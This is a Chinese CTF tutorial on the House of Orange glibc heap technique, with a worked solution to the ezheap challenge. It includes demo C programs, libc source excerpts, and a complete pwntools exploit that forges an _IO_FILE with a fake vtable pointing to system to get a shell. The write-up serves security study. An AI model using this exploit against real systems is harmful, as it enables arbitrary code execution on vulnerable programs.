# House of Orange

## 介绍:

1. House of Orange 与其他的 House of XX 利用方法不同，这种利用方法来自于 Hitcon CTF 2016 中的一道同名题目。由于这种利用方法在此前的 CTF 题目中没有出现过，因此之后出现的一系列衍生题目的利用方法我们称之为 House of Orange。

## 概述：

1. House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是特殊之处在于题目中不存在 free 函数或其他释放堆块的函数。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中无法使用 free 函数，因此 House of Orange 核心就是**通过漏洞利用获得 free 的效果**。

### 原理：

1. 如我们前面所述，House of Orange 的核心在于**在没有 free 函数的情况下得到一个释放的堆块** (unsorted bin)。 这种操作的原理简单来说是**当前堆的 top chunk 尺寸不足以满足申请分配的大小**的时候，**原来的 top chunk 会被释放并被置入 unsorted bin 中**，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。

2. 我们来看一下这个过程的详细情况，我们假设目前的 top chunk 已经不满足 malloc 的分配需求。 首先我们在程序中的`malloc`调用会执行到 libc.so 的`_int_malloc`函数中，在`_int_malloc`函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，因为尺寸问题这些都不符合。接下来`_int_malloc`函数会试图使用 top chunk，在这里 top chunk 也不能满足分配的要求，因此会执行如下分支。

   ```c
   /*
   Otherwise, relay to handle system-dependent cases
   */
   else {
         void *p = sysmalloc(nb, av);
         if (p != NULL && __builtin_expect (perturb_byte, 0))
           alloc_perturb (p, bytes);
         return p;
   }
   ```

   此时 ptmalloc 已经不能满足用户申请堆内存的操作，需要执行 sysmalloc 来向系统申请更多的空间。 但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要**让堆以 brk 的形式拓展**，之后**原有的 top chunk 会被置于 unsorted bin 中**。

   综上，我们要实现 brk 拓展 top chunk，但是要实现这个目的需要绕过一些 libc 中的 check。 首先，malloc 的尺寸不能大于`mmp_.mmap_threshold`

   ```c
   if ((unsigned long)(nb) >= (unsigned long)(mp_.mmap_threshold) && (mp_.n_mmaps < mp_.n_mmaps_max))
   ```

   如果所需分配的 chunk 大小**大于 mmap 分配阈值，默认为 128K = 0x2000**，并且当前进程**使用 mmap() 分配的内存块** （当前mmap的数量小于最大值）小于设定的最大值，将使用 mmap() 系统调用直接向操作系统申请内存。

   在 sysmalloc 函数中存在对 top chunk size 的 check，如下：

   ```c
   assert((old_top == initial_top(av) && old_size == 0) ||
        ((unsigned long) (old_size) >= MINSIZE &&
         prev_inuse(old_top) &&
         ((unsigned long)old_end & pagemask) == 0));
   ```

   这里检查了 top chunk 的合法性，如果第一次调用本函数，top chunk 可能没有初始化，所以可能 old_size 为 0。 如果 top chunk 已经初始化了，那么 **top chunk 的大小必须大于等于 MINSIZE**，因为 top chunk 中包含了 fencepost，所以 top chunk 的大小必须要大于 MINSIZE。其次 **top chunk 必须标识前一个 chunk 处于 inuse 状态**，并且 top **chunk 的结束地址必定是页对齐**的。此外 top chunk 除去 fencepost 的大小必定要小于所需 chunk 的大小，否则在_int_malloc() 函数中会使用 top chunk 分割出 chunk。

3. 我们总结一下**伪造的 top chunk size** 的要求：

   * 伪造的 size 必须要**对齐到内存页** 

   * size 要**大于 MINSIZE(0x10) ** 

   * size 要**小于之后申请的 chunk size + MINSIZE(0x10)** 

   * size 的 **prev inuse 位必须为 1** 

   之后原有的 top chunk 就会执行`_int_free`从而顺利进入 unsorted bin 中



### 示例：

1. 这里给出了一个示例程序，程序模拟了一个溢出覆盖到 top chunk 的 size 域。我们试图把 size 改小从而实现 brk 扩展，并把原有的 top chunk 放入 unsorted bin 中：

   ```c
   #include <stdlib.h>
   #define fake_size 0x41
   
   int main(void)
   {
       void *ptr;
   
       ptr=malloc(0x10);
       ptr=(void *)((long long)ptr+24);
   
       *((long long*)ptr)=fake_size; // overwrite top chunk size
   
       malloc(0x60);
   
       malloc(0x60);
   }
   ```

   这里我们把 **top chunk 的 size 覆盖为 0x41**。之后申请**大于这个尺寸的堆块**，即 0x60。 但是当我们执行这个示例时会发现，这个程序并不能利用成功，原因在于 **assert 并没有被满足**从而抛出了异常，调试如下：

   通过topchunk地址 + topchunk大小 得到页面地址：

   ![](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408011713268.png)

   检查top chunk的prev_inuse位是否为1：

   ![](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408011714766.png)

   最后页面对齐检查不通过而报错：

   ![image-20240801171701999](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408011717656.png)

   

### 正确实例：

1. 要让伪造的top chunk对齐页面（按0x1000对齐）：什么是对齐到内存页呢？我们知道现代操作系统都是以内存页为单位进行内存管理的，一般内存页的大小是 4kb。那么我们伪造的 size 就必须要对齐到这个尺寸。在覆盖之前 top chunk 的 size 大小是 20fe1，通过计算得知 0x602020+0x20fe0=0x623000 是对于 0x1000（4kb）对齐的。

2. 看人家正常分配给我们的top 地址和大小，0x405020 + 0x20fe0 = 0x426000 对于0x1000是按0x1000对齐的：

   ![image-20240801171922332](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408011719404.png)

   所以问你伪造的top size大小应该是0x20fe1 、0x0fe1、0x1fe1等等，保证与top chunk地址相加后低12位（比特）全为0：

   ```c
   #include <stdlib.h>
   #define fake_size 0x1fe1
   
   int main(void)
   {
       void *ptr;
       ptr=malloc(0x10);
       ptr=(void *)((long long)ptr+24);
       *((long long*)ptr)=fake_size;// overwrite top chunk size
       malloc(0x2000);		//分配一个大于top chunksize的chunk，使得原top chunk进入unsorted bin
       malloc(0x60);		//从已进入unsortedbin的原top chunk中切分chunk
   }
   ```

   ![image-20240801172709003](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408011727519.png)

   ![image-20240801172927542](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408011729646.png)

   计算得到&top chunk + size：

   ![image-20240801173213945](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408011732481.png)

   prev_inuse位和页面对齐检查通过：

   ![image-20240801173459318](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408011734914.png)

   分配完成后：

   ![image-20240801173948488](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408011739134.png)

   新分配的堆地址在**0x426010** （原始堆的结尾），后面跟的是新的topchunk：

   ![image-20240801174915646](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408011749984.png)

   再分配堆时会从**unsorted bin中切割原来的top chunk**：

   ![](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408011750583.png)

   其实 house of orange 的要点正在于此，之后的利用因为涉及到，利用unsorted bin修改_IO_FILE 的知识，放到 IO_FILE 独立章节分享。

   如果修改此时的unsorted bin的包括指针，就可以将main_arena写到任意地址，下次分配就会往0x405160 + 0x10的地址写入main_arena地址：

   ![](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408011804963.png)

   成功写入main_arena地址：

   ![image-20240801180642525](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408011806673.png)



## 例题：[安洵杯 2021\]ezheap

题目地址：[[安洵杯 2021\]ezheap | NSSCTF](https://www.nssctf.cn/problem/914)

### 思路：

在申请chunk时，在**unsorted bin中查找的过程**：先遍历一遍unsorted bin，查看是否有相应大小的chunk，并将对应bin放入small bin和large bin。如果没有适合大小的chunk，再从small bin或者large bin中切割，切割剩余的放入unsorted bin。

1. 利用HOR ，使用堆溢出修改top chunk的size，再申请一个较大的chunk，使原top chunk进入unsorted bin，从而泄漏libc地址。
2. 利用堆溢出修改unsorted bin的bk指针，实现unsorted bin attack，来覆盖掉IO_list_all指针，指向main_arena_88，并同时修改unsorted bin的size大小为0x60，使其能进入smallbin0x60，进而让main_arena_88 + 0x68（_chain）能衔接到unsorted bin来伪造FILE。

### 分析：

1. gift后门函数给了一个堆地址：

   ![image-20240811172352827](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408111723877.png)

2. 只有add、edit、show函数，没有free函数，且只能一次控制一个堆块。其中，edit函数能造成堆溢出：

   ![image-20240811172506901](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408111725975.png)



### 利用：

1. 泄漏堆地址，修改size大小，泄漏libc地址：

   ```python
   
   # 回收heap地址
   heap_addr = eval(p.recv(14).decode())-0x10
   success("heap_addr ==> " + hex(heap_addr))
   
   # 泄漏libc地址
   add(0x10,b"lzl")
   payload = p64(0)*3 + p64(0xfc1)
   edit(payload)
   add(0x1000,b"lzl")
   
   add(0x10,b"a"*8)
   show()
   p.recv()
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   success("main_arena_unsortbin_addr==>"+hex(addr))
   main_arena_offset = libc.symbols["__malloc_hook"]+0x10
   success("main_arena_offset==>"+hex(main_arena_offset))
   libc_base = (addr-(main_arena_offset+0x58)-0x610)
   success("libc_addr==>"+hex(libc_base))
   
   IO_list_all_addr = libc_base + libc.symbols["_IO_list_all"]
   success("IO_list_all_addr ==>"+hex(IO_list_all_addr))
   system_addr = libc_base+libc.sym["system"]
   free_hook_addr = libc_base+libc.sym["__free_hook"]
   success("system_addr==>"+hex(system_addr))
   success("free_hook_addr==>"+hex(free_hook_addr))
   ```

   ![image-20240812113046357](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408121130466.png)

   ![image-20240812112857981](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408121128130.png)

2. 修改**unsorted bin的size**值，使之后续能**进入到small bin0x60**，并且**在该unsorted bin中伪造好file结构**和**unsorted bin attack**，最后能覆盖掉IO_list_all指针，成功挟持到FILE，后面会解释为什么这么伪造：

   ```py
   # unsorted bin attack 覆盖IO_list_all指针
   # 构造IO_file
   payload = p64(0)*2
   # file头
   payload+= b"/bin/sh\x00" + p64(0x60)
   # unsorted bin attack
   payload+= p64(0) + p64(IO_list_all_addr-0x10)
   # _IO_write_ptr > _IO_write_base
   payload+= p64(0) + p64(1)
   #_mode=0
   payload = payload.ljust(0xe8,b"\x00")
   # 伪造vtable指针，因为相距FILE头的偏移是0xe8，所以前面要填满0xe8
   payload+= p64(heap_addr + 0x140) #指向后面的虚表
   # 虚表
   payload+= p64(0)*3 + p64(system_addr)
   edit(payload)
   ```

   伪造的IO_FILE：

   注意再libc_2.23之前IO_list_all是可以修改的，有写权限：

   ![image-20240812165830493](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408121658781.png)

   ![image-20240812161200441](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408121612691.png)

   再申请chunk时：先遍历一遍unsorted bin，查看是否有相应大小的chunk，并将对应bin放入small bin和large bin：

   ![image-20240812161541465](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408121615721.png)

   main_arena中的情况：

   ![image-20240812162742131](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408121627390.png)

   后续由于前面unsorted bin的fd和bk被修改，导致malloc时出错，会**调用malloc_printerr 打印错误**信息，就会使用前面被覆盖的IO_list_all。

   ### 介绍一条 IO_FILE 链：

   malloc中unsorted bin出错会调用malloc_printerr 输出错误：

   ![image-20240813114500591](C:\Users\BKBQWQ\AppData\Roaming\Typora\typora-user-images\image-20240813114500591.png)

   malloc_printerr 函数：

   ![image-20240812174218150](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408121742266.png)

   跟进__libc_message函数，最后也调用了abort函数：

   ```c
   /* Abort with an error message.  */
   void
   __libc_message (int do_abort, const char *fmt, ...)
   {
     va_list ap;
     int fd = -1;
   
     va_start (ap, fmt);
   
   #ifdef FATAL_PREPARE
     FATAL_PREPARE;
   #endif
   
     /* Open a descriptor for /dev/tty unless the user explicitly
        requests errors on standard error.  */
     const char *on_2 = __libc_secure_getenv ("LIBC_FATAL_STDERR_");
     if (on_2 == NULL || *on_2 == '\0')
       fd = open_not_cancel_2 (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);
   
     if (fd == -1)
       fd = STDERR_FILENO;
   
     struct str_list *list = NULL;
     int nlist = 0;
   
     const char *cp = fmt;
     while (*cp != '\0')
       {
         /* Find the next "%s" or the end of the string.  */
         const char *next = cp;
         while (next[0] != '%' || next[1] != 's')
   	{
   	  next = __strchrnul (next + 1, '%');
   
   	  if (next[0] == '\0')
   	    break;
   	}
   
         /* Determine what to print.  */
         const char *str;
         size_t len;
         if (cp[0] == '%' && cp[1] == 's')
   	{
   	  str = va_arg (ap, const char *);
   	  len = strlen (str);
   	  cp += 2;
   	}
         else
   	{
   	  str = cp;
   	  len = next - cp;
   	  cp = next;
   	}
   
         struct str_list *newp = alloca (sizeof (struct str_list));
         newp->str = str;
         newp->len = len;
         newp->next = list;
         list = newp;
         ++nlist;
       }
   
     bool written = false;
     if (nlist > 0)
       {
         struct iovec *iov = alloca (nlist * sizeof (struct iovec));
         ssize_t total = 0;
   
         for (int cnt = nlist - 1; cnt >= 0; --cnt)
   	{
   	  iov[cnt].iov_base = (char *) list->str;
   	  iov[cnt].iov_len = list->len;
   	  total += list->len;
   	  list = list->next;
   	}
   
         written = WRITEV_FOR_FATAL (fd, iov, nlist, total);
   
         if (do_abort)
   	{
   	  total = ((total + 1 + GLRO(dl_pagesize) - 1)
   		   & ~(GLRO(dl_pagesize) - 1));
   	  struct abort_msg_s *buf = __mmap (NULL, total,
   					    PROT_READ | PROT_WRITE,
   					    MAP_ANON | MAP_PRIVATE, -1, 0);
   	  if (__glibc_likely (buf != MAP_FAILED))
   	    {
   	      buf->size = total;
   	      char *wp = buf->msg;
   	      for (int cnt = 0; cnt < nlist; ++cnt)
   		wp = mempcpy (wp, iov[cnt].iov_base, iov[cnt].iov_len);
   	      *wp = '\0';
   
   	      /* We have to free the old buffer since the application might
   		 catch the SIGABRT signal.  */
   	      struct abort_msg_s *old = atomic_exchange_acq (&__abort_msg,
   							     buf);
   	      if (old != NULL)
   		__munmap (old, old->size);
   	    }
   	}
       }
     va_end (ap);
     if (do_abort)
       {
         BEFORE_ABORT (do_abort, written, fd);
   
         /* Kill the application.  */
         abort ();
       }
   }
   ```

   跟进abort函数，其中调用了fflush函数：

   ```c
   /* Cause an abnormal program termination with core-dump.  */
   void
   abort (void)
   {
     struct sigaction act;
     sigset_t sigs;
   
     /* First acquire the lock.  */
     __libc_lock_lock_recursive (lock);
   
     /* Now it's for sure we are alone.  But recursive calls are possible.  */
   
     /* Unlock SIGABRT.  */
     if (stage == 0)
       {
         ++stage;
         if (__sigemptyset (&sigs) == 0 &&
   	  __sigaddset (&sigs, SIGABRT) == 0)
   	__sigprocmask (SIG_UNBLOCK, &sigs, (sigset_t *) NULL);
       }
   
     /* Flush all streams.  We cannot close them now because the user
        might have registered a handler for SIGABRT.  */
     if (stage == 1)
       {
         ++stage;
         fflush (NULL);
       }
   ······
   }
   ```

   跟进fflush函数，fflush是一个宏定义，调用了IO_fflush函数，且参数是NULL：

   ![image-20240812174952791](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408121749884.png)

   继续跟进IO_fflush(NULL)，由于传入的参数为NULL，所以会调用_IO_flush_all函数:

   ```c
   int
   _IO_fflush (_IO_FILE *fp)
   {
     if (fp == NULL)
       return _IO_flush_all ();
     else
       {
         int result;
         CHECK_FILE (fp, EOF);
         _IO_acquire_lock (fp);
         result = _IO_SYNC (fp) ? EOF : 0;
         _IO_release_lock (fp);
         return result;
       }
   }
   ```

   跟进_IO_flush_all函数，_IO_flush_all_lockp调用了_IO_flush_all_lockp(1)：

   ```c
   int
   _IO_flush_all (void)
   {
     /* We want locking.  */
     return _IO_flush_all_lockp (1);
   }
   ```

   跟进_IO_flush_all_lockp(1)，而 _IO_flush_all_lockp就是这条FILE终点:

   ![image-20240812175836473](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408121758546.png)

   ```c
   int
   _IO_flush_all_lockp (int do_lock)
   {
     int result = 0;
     struct _IO_FILE *fp;
     int last_stamp;
   
   #ifdef _IO_MTSAFE_IO
     __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
     if (do_lock)
       _IO_lock_lock (list_all_lock);
   #endif
   
     last_stamp = _IO_list_all_stamp;
     fp = (_IO_FILE *) _IO_list_all;//这里fp取到了_IO_list_all 这里fp直接指向了_IO_2_1_stderr_首地址
     while (fp != NULL)//进入循环
       {
         run_fp = fp;
         if (do_lock)
   	_IO_flockfile (fp);
   
         if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
   #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
   	   || (_IO_vtable_offset (fp) == 0
   	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
   				    > fp->_wide_data->_IO_write_base))
   #endif
   	   )
   	  && _IO_OVERFLOW (fp, EOF) == EOF)//这里经过前面的判断后调用了_IO_OVERFLOW(fp,EOF)
   	result = EOF;
   
         if (do_lock)
   	_IO_funlockfile (fp);
         run_fp = NULL;
   
         if (last_stamp != _IO_list_all_stamp)
   	{
   	  /* Something was added to the list.  Start all over again.  */
   	  fp = (_IO_FILE *) _IO_list_all;
   	  last_stamp = _IO_list_all_stamp;
   	}
         else
   	fp = fp->_chain;//这里使用FILE结构中的_chain来更新fp
       }
   
   #ifdef _IO_MTSAFE_IO
     if (do_lock)
       _IO_lock_unlock (list_all_lock);
     __libc_cleanup_region_end (0);
   #endif
   
     return result;
   }
   ```

   查看_IO_OVERFLOW(fp, EOF)定义，以及最后的：

   ```c
   //libc_2.23 的定义
   define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
   define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)
   define _IO_JUMPS_FUNC(THIS) (*(struct _IO_jump_t **) ((void *) &_IO_JUMPS_FILE_plus (THIS) + (THIS)->_vtable_offset))
       
   //结合传入的参数转化后如下：相当于调用了fp的__overflow函数
   define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
   define JUMP1(__overflow, FP, CH) (_IO_JUMPS_FUNC(FP)->__overflow) (FP, CH)
   define _IO_JUMPS_FUNC(FP) (*(struct _IO_jump_t **) ((void *) &_IO_JUMPS_FILE_plus (FP) + (FP)->_vtable_offset))
       
   
       
       
       
       
   //在libc_2.24后：_IO_JUMPS_FUNC的宏定义变化
   define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)
   define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))
       
   /* Check if unknown vtable pointers are permitted; otherwise,
      terminate the process.  */
   void _IO_vtable_check (void) attribute_hidden; //提前声明
   
   /* Perform vtable pointer validation.  If validation fails, terminate
      the process.  */
   static inline const struct _IO_jump_t *
   IO_validate_vtable (const struct _IO_jump_t *vtable)
   {
     /* Fast path: The vtable pointer is within the __libc_IO_vtables
        section.  */
     uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
     const char *ptr = (const char *) vtable;
     uintptr_t offset = ptr - __start___libc_IO_vtables;
     if (__glibc_unlikely (offset >= section_length))
       /* The vtable pointer is not in the expected section.  Use the
          slow path, which will terminate the process if necessary.  */
       _IO_vtable_check ();
     return vtable;
   }
   
   void attribute_hidden _IO_vtable_check (void)
   {
   #ifdef SHARED
     /* Honor the compatibility flag.  */
     void (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables);
   #ifdef PTR_DEMANGLE
     PTR_DEMANGLE (flag);
   #endif
     if (flag == &_IO_vtable_check)
       return;
   
     /* In case this libc copy is in a non-default namespace, we always
        need to accept foreign vtables because there is always a
        possibility that FILE * objects are passed across the linking
        boundary.  */
     {
       Dl_info di;
       struct link_map *l;
       if (_dl_open_hook != NULL
           || (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0
               && l->l_ns != LM_ID_BASE))
         return;
     }
   
   #else /* !SHARED */
     /* We cannot perform vtable validation in the static dlopen case
        because FILE * handles might be passed back and forth across the
        boundary.  Therefore, we disable checking in this case.  */
     if (__dlopen != NULL)
       return;
   #endif
   
     __libc_fatal ("Fatal error: glibc detected an invalid stdio handle\n");
   }
       
   
   ```

   最后找函数地址时，使用了_vtable_offset 即 _IO_FILE 结构体的 vtable 指针，而vtable 指针指向的是一个虚表，所以相当于最后调用到了下面的_IO_file_overflow函数，并且传入的参数是fp指针，即文件的地址：

   ![image-20240812181423518](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408121814711.png)

   ![image-20240812180745597](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408121807778.png)

   随意最后IO_FILE链为：malloc报错 ==> malloc_printerr  ==> __libc_message ==> abort ==> fflush ==> IO_fflush ==> _IO_flush_all ==> _IO_flush_all_lockp ==> _IO_OVERFLOW(最后使用vtable 指向的虚表中的指针)，

   最后在_IO_flush_all_lockp中时有两个**判断条件**需要绕过，才能调用到_IO_OVERFLOW ：

   * fp->_mode <= 0
   * fp-> _IO_write_ptr > fp->_IO_write_base

   所以，在**unsorted bin中构造的IO_FILE**要满足这两个条件即可，最后伪造虚表，并用**system地址覆盖**掉_OVERFLOW指针，并在**vtable位置伪造指针** ，指向这个虚表即可 。

3. 完整EXP：

   ```py
   from pwn import *
   import numpy as np
   # from LibcSearcher import *
   context(os='linux', arch='amd64', log_level='debug')
   
   def debug():
       print(proc.pidof(p))
       pause()
   
   # p = remote("node4.anna.nssctf.cn",28353)
   # libc = ELF('./libc.so.6')
   p = process("./pwn") 
   libc = ELF("/home/kali/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
   # elf = ELF("./pwn")
   
   
   def add(size,name):
       p.sendlineafter(b':',b'1')
       p.sendlineafter(b'it',str(size).encode())
       p.sendafter(b"?",name)
   
   def edit(content):
       p.sendlineafter(b':',b'2')
       p.sendlineafter(b"it",str(len(content)).encode())
       p.sendafter(b"name",content)
   
   def show():
       p.sendlineafter(b':',b'3')
   
   # 回收heap地址
   heap_addr = eval(p.recv(14).decode())-0x10
   success("heap_addr ==> " + hex(heap_addr))
   
   # 泄漏libc地址
   add(0x10,b"lzl")
   payload = p64(0)*3 + p64(0xfc1)
   edit(payload)
   add(0x1000,b"lzl")
   
   add(0x10,b"a"*8)
   show()
   p.recv()
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   success("main_arena_unsortbin_addr==>"+hex(addr))
   main_arena_offset = libc.symbols["__malloc_hook"]+0x10
   success("main_arena_offset==>"+hex(main_arena_offset))
   libc_base = (addr-(main_arena_offset+0x58)-0x610)
   success("libc_addr==>"+hex(libc_base))
   
   IO_list_all_addr = libc_base + libc.symbols["_IO_list_all"]
   success("IO_list_all_addr ==>"+hex(IO_list_all_addr))
   system_addr = libc_base+libc.sym["system"]
   free_hook_addr = libc_base+libc.sym["__free_hook"]
   success("system_addr==>"+hex(system_addr))
   success("free_hook_addr==>"+hex(free_hook_addr))
   
   # unsorted bin attack 覆盖IO_list_all指针
   # 构造IO_file
   payload = p64(0)*2
   # file头
   payload+= b"/bin/sh\x00" + p64(0x60)
   # unsorted bin attack
   payload+= p64(0) + p64(IO_list_all_addr-0x10)
   # _IO_write_ptr > _IO_write_base
   payload+= p64(0) + p64(1)
   payload = payload.ljust(0xe8,b"\x00")
   payload+= p64(heap_addr + 0x140) + p64(0)*3 + p64(system_addr)
   
   edit(payload)
   p.sendlineafter(b':',b'1')
   p.sendlineafter(b'it',str(0x10).encode())
   p.sendline(b"cat flag")
   p.interactive()
   ```

   

![image-20240811163730006](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408111637069.png)

![image-20240812213203056](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408122132253.png)







